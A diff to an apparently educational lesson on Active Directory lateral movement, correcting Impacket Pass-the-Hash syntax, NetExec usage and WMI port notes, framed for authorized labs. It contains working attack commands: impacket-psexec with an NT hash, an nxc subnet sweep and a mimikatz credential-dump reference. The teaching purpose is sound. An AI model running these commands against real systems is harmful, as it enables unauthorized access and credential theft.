@@ -6,6 +6,8 @@
 
 Lateral movement is how a foothold on one host becomes access to many. After credential harvesting (Phase 01 taught you where to look), this phase covers replaying those credentials across the network with Pass-the-Hash, Pass-the-Ticket, and the standard remote-execution channels, then tunneling through segments you cannot reach directly. Every technique below is for authorized labs and signed engagements only.
 
+**Prerequisites:** the accounts, hosts, and hashes used below come from the lab in [labs/ad-lab-setup.md](../labs/ad-lab-setup.md) — `corp.local`, `jdoe`/`bob`/`da.smith`, `DC01`/`SRV01`, `10.10.10.x`. Nothing here is reachable without that environment (or your own equivalent); the guided chains are in [labs/attack-simulations.md](../labs/attack-simulations.md).
+
 ## What You Move With
 
 - **NT hash** → Pass-the-Hash (PtH): authenticate to SMB, WMI, WinRM, PsExec, RDP (Restricted Admin). No password needed.
@@ -20,13 +22,13 @@ The server only verifies that you know the NT hash; you never need the plaintext
 ```bash
 # Obtain hashes first (authorized host): mimikatz "sekurlsa::logonpasswords",
 # or dump SAM/SYSTEM. Then replay:
-impacket-psexec corp.local/jdoe@10.10.10.20 -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+impacket-psexec corp.local/jdoe@10.10.10.20 -hashes :8846f7eaee8fb117ad06bdd830b7586c
 # Expected outcome: NT AUTHORITY\SYSTEM shell on the target via a temporary service
 ```
 
 ```bash
-# Check which machines accept a hash with CrackMapExec (SMB), then pick a channel
-crackmapexec smb 10.10.10.0/24 -u jdoe -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
+# Check which machines accept a hash with NetExec (SMB, ex-CrackMapExec), then pick a channel
+nxc smb 10.10.10.0/24 -u jdoe -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
 # Expected outcome: [+] rows with (Pwn3d!) when the user is local admin
 ```
 
@@ -61,7 +63,7 @@ impacket-psexec -k -no-pass corp.local/jdoe@filesrv.corp.local
 | Channel | Ports | Tooling | Notes |
 |---|---|---|---|
 | PsExec-style (SMB) | 445 | `impacket-psexec`, `smbexec.py`, Sysinternals PsExec | Creates a service on `ADMIN$`; loudest, needs admin over SMB |
-| WMI | 135 + dynamic | `impacket-wmiexec`, `wmic` | Runs via WMI; no file dropped when using wmiexec's semi-interactive mode |
+| WMI | 135 + 445 | `impacket-wmiexec`, `wmic` | Executes via WMI; `wmiexec` returns output by writing to `ADMIN$` over 445, so it needs admin |
 | WinRM | 5985/5986 | `evil-winrm`, `winrm` | Cleanest output; user needs Remote Management Users/admin rights |
 | Scheduled tasks | 445 / RPC | `impacket-atexec`, `schtasks` | Executes one command as SYSTEM via Task Scheduler |
 | SMB shares | 445 | `smbclient`, manual | Stage payloads; execute via another channel |
@@ -134,7 +136,7 @@ Rule of thumb: keep tool traffic inside the tunnel; run port scans with `-sT` (S
 ## Common Mistakes & Tips
 
 - **PtH against the wrong account type:** try domain accounts before local; local-account token filtering silently kills many PtH attempts.
-- **Forgetting the LM half:** most Impacket tools expect the `LMHASH:NTHASH` format; pass `aad3b435b51404eeaad3b435b51404ee:` as the LM part when you only have the NT hash.
+- **Forgetting the LM half:** most Impacket tools expect the `LMHASH:NTHASH` pair — exactly two fields. When you only have the NT hash, leave the LM half empty (`-hashes :NTHASH`) or reuse the `aad3b435b51404eeaad3b435b51404ee` placeholder (`-hashes aad3b435b51404eeaad3b435b51404ee:NTHASH`); a third colon makes Impacket fail to unpack the value.
 - **WinRM vs. PSRemoting trust:** `evil-winrm` uses WinRM; some hosts allow one and not the other — test both channels.
 - **Single-channel tunnel:** always record which internal networks each compromised host can reach (`ipconfig`/`route print`) before pivoting, or you will tunnel blind.
 - **Leaving services behind:** PsExec-style tools create services/tasks; remove them (`sc delete`/`schtasks /delete`) in the lab and note cleanup in your report.
@@ -149,6 +151,8 @@ Rule of thumb: keep tool traffic inside the tunnel; run port scans with `-sT` (S
 - [ ] I can hop via RDP using Restricted Admin / PtH without sending plaintext passwords.
 - [ ] I can set up SOCKS and port-forward tunnels (SSH and Chisel) and scan a remote segment through them.
 - [ ] I know which log/event artifacts each movement technique leaves behind.
+
+> **Verification:** the Impacket `-hashes` format was checked against upstream `examples/psexec.py` (line 87, `hashes.split(':')`; `metavar = "LMHASH:NTHASH"` at line 613) and the wmiexec output path against upstream `examples/wmiexec.py` (default share `ADMIN$`) on 2026-09-19. Corrections applied from the 19 Sep 2026 audit.
 
 ## Further Resources
 
